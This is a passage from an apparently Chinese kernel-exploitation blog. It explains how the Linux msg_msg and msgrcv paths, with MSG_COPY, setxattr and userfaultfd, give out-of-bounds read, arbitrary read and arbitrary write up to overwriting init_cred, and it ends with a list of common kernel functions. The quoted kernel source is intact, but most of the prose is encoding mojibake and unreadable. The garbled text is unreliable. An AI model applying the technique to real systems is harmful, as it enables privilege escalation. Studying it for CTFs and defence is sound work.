‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"   >
          <a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="headerlink" title="A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"></a>A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</h5>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ<code>MSG_COPY</code>è¿™ä¸ª<code>msgflg</code>æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„<code>unlink</code>è§¦å‘é”™è¯¯ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®<code>CONFIG_CHECKPOINT_RESTORE=y</code>æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>ğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„<code>v5.11</code>ä¸­ï¼Œ<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº<code>copy_msg()</code>å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>æ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–<code>rdi(msg)</code>å’Œ<code>rsi(copy)</code>å¯¹åº”çš„<code>m_ts</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ<code>copy</code>çš„<code>m_ts</code>æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„<code>msg</code>çš„<code>m_ts</code>é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚</p>

        <h5 id="B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"   >
          <a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="headerlink" title="B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"></a>B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</h5>
      <p>åŒç†å¦‚æœä¸æŒ‡å®š<code>MSG_COPY</code>è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>mtype</code>å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>msgtpy</code>æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚</p>

        <h5 id="C-æ•°æ®å¤åˆ¶"   >
          <a href="#C-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-æ•°æ®å¤åˆ¶" class="headerlink" title="C.æ•°æ®å¤åˆ¶"></a>C.æ•°æ®å¤åˆ¶</h5>
      <p>ä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦<code>size</code>å°äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„<code>m_ts</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨-1"   >
          <a href="#3-åˆ©ç”¨-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨-1" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="è¶Šç•Œè¯»å–"   >
          <a href="#è¶Šç•Œè¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¶Šç•Œè¯»å–" class="headerlink" title="è¶Šç•Œè¯»å–"></a>è¶Šç•Œè¯»å–</h4>
      <p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„<code>double-free/UAF</code>ï¼Œå¹¶ä¸”å†ä½¿ç”¨<code>setxattr</code>æ¥å¯¹<code>msg_msgmsg</code>ä¸­çš„<code>m_ts</code>è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨<code>msgrcv</code>çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚</p>
<p><strong>ä½¿ç”¨<code>setxattr</code>çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·</strong></p>
<p>ä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª<code>msg_queue</code>å’Œå•ä¸ª<code>msg_msg</code>çš„å†…å­˜æ¨¡å‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>å¯ä»¥çœ‹åˆ°å•ä¸ª<code>msg_msg</code>åœ¨<code>msg_queue</code>çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡<code>msgget</code>å’Œ<code>msgsnd</code>å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“çš„<code>msg_queue</code>ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª<code>msg_msg</code>çš„å¤´éƒ¨äº†</p>
<p>è€Œå•ä¸ª<code>msg_msg</code>ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘<code>msg_queue</code>çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º<code>msg_queue</code>çš„å †åœ°å€äº†ã€‚</p>

        <h4 id="ä»»æ„è¯»å–"   >
          <a href="#ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„è¯»å–" class="headerlink" title="ä»»æ„è¯»å–"></a>ä»»æ„è¯»å–</h4>
      <p>å®Œæˆä¸Šè¿°æ³„éœ²<code>msg_queue</code>çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°<code>msg_msg</code>çš„å†…å­˜å¸ƒå±€äº†</p>
<p>ç”±äºæˆ‘ä»¬çš„<code>msg_msg</code>æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>ç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>next</code>æŒ‡é’ˆå’Œ<code>m_ts</code>ï¼Œç»“åˆè¯»å–<code>msg</code>æœ€ç»ˆè°ƒç”¨å‡½æ•°<code>store_msg</code>çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°<code>msg_queue</code>ä¹‹åï¼Œå¯ä»¥å†å°†<code>msg_msg</code>çš„nextæŒ‡é’ˆæŒ‡å›<code>msg_queue</code>ï¼Œè¯»å‡ºå…¶ä¸­çš„<code>msg_msg</code>ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚</p>
<p>è¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ<code>userfaultfd</code>å’Œ<code>setxattr</code>é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚</p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚</p>

        <h4 id="ä»»æ„å†™"   >
          <a href="#ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h4>
      <p>åŒæ ·çš„ï¼Œ<code>msg_msg</code>ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ<code>msgsnd</code>ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨<code>userfaultfd</code>åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>init_cred</code>ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚</p>

        <h1 id="åã€å¸¸è§å‡½æ•°æ€»ç»“"   >
          <a href="#åã€å¸¸è§å‡½æ•°æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#åã€å¸¸è§å‡½æ•°æ€»ç»“" class="headerlink" title="åã€å¸¸è§å‡½æ•°æ€»ç»“"></a>åã€å¸¸è§å‡½æ•°æ€»ç»“</h1>
      
        <h2 id="printk"   >
          <a href="#printk" class="heading-link"><i class="fas fa-link"></i></a><a href="#printk" class="headerlink" title="printk:"></a><code>printk</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printk(æ—¥å¿—çº§åˆ« <span class="string">&quot;æ¶ˆæ¯æ–‡æœ¬&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#defineKERN_EMERG <span class="string">&quot;&lt;0&gt;&quot;</span><span class="comment">/*ç´§æ€¥äº‹ä»¶æ¶ˆæ¯ï¼Œç³»ç»Ÿå´©æºƒä¹‹å‰æç¤ºï¼Œè¡¨ç¤ºç³»ç»Ÿä¸å¯ç”¨*/</span></span><br><span class="line">#defineKERN_ALERT <span class="string">&quot;&lt;1&gt;&quot;</span><span class="comment">/*æŠ¥å‘Šæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¿…é¡»ç«‹å³é‡‡å–æªæ–½*/</span></span><br><span class="line">#defineKERN_CRIT <span class="string">&quot;&lt;2&gt;&quot;</span><span class="comment">/*ä¸´ç•Œæ¡ä»¶ï¼Œé€šå¸¸æ¶‰åŠä¸¥é‡çš„ç¡¬ä»¶æˆ–è½¯ä»¶æ“ä½œå¤±è´¥*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_ERR <span class="meta-string">&quot;&lt;3&gt;&quot;</span><span class="comment">/*é”™è¯¯æ¡ä»¶ï¼Œé©±åŠ¨ç¨‹åºå¸¸ç”¨KERN_ERRæ¥æŠ¥å‘Šç¡¬ä»¶çš„é”™è¯¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_WARNING <span class="meta-string">&quot;&lt;4&gt;&quot;</span><span class="comment">/*è­¦å‘Šæ¡ä»¶ï¼Œå¯¹å¯èƒ½å‡ºç°é—®é¢˜çš„æƒ…å†µè¿›è¡Œè­¦å‘Š*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_NOTICE <span class="meta-string">&quot;&lt;5&gt;&quot;</span><span class="comment">/*æ­£å¸¸ä½†åˆé‡è¦çš„æ¡ä»¶ï¼Œç”¨äºæé†’ã€‚å¸¸ç”¨äºä¸å®‰å…¨ç›¸å…³çš„æ¶ˆæ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_INFO <span class="meta-string">&quot;&lt;6&gt;&quot;</span><span class="comment">/*æç¤ºä¿¡æ¯ï¼Œå¦‚é©±åŠ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ‰“å°ç¡¬ä»¶ä¿¡æ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_DEBUG <span class="meta-string">&quot;&lt;7&gt;&quot;</span><span class="comment">/*è°ƒè¯•çº§åˆ«çš„æ¶ˆæ¯*/</span></span></span><br></pre></td></tr></table></div></figure>


        <h2 id="kmalloc"   >
          <a href="#kmalloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc" class="headerlink" title="kmalloc:"></a><code>kmalloc</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­flagsä¸€èˆ¬è®¾ç½®ä¸ºGFP_KERNELæˆ–è€…GFP_DMAï¼Œåœ¨å †é¢˜ä¸­ä¸€èˆ¬å°±æ˜¯</p>
<p>GFP_KERNELæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<p>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€ã€€GFP_KERNEL<br>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ ä¸­æ–­å¤„ç†ç¨‹åºã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ è½¯ä¸­æ–­ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ Taskletã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€GFP_DMA | GFP_KERNEL<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€GFP_DMA <strong>|GFP_ATOMIC</strong></p>
<p>å…·ä½“å¯ä»¥çœ‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sky-heaven/p/7390370.html" >Linuxå†…æ ¸ç©ºé—´å†…å­˜ç”³è¯·å‡½æ•°kmallocã€kzallocã€vmallocçš„åŒºåˆ«ã€è½¬ã€‘ - sky-heaven - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>kzmalloc</code>ç±»ä¼¼ï¼Œå°±æ˜¯åˆ†é…ç©ºé—´å¹¶ä¸”å†…å­˜åˆå§‹åŒ–ä¸º0</p>

        <h2 id="kfree"   >
          <a href="#kfree" class="heading-link"><i class="fas fa-link"></i></a><a href="#kfree" class="headerlink" title="kfree:"></a><code>kfree</code>:</h2>
      <p>è¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œå°±æ˜¯ç®€å•çš„é‡Šæ”¾ã€‚</p>

        <h2 id="copy-from-user"   >
          <a href="#copy-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-from-user" class="headerlink" title="copy_from_user:"></a><code>copy_from_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>


        <h2 id="copy-to-user"   >
          <a href="#copy-to-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-to-user" class="headerlink" title="copy_to_user:"></a><code>copy_to_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_to_user(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>

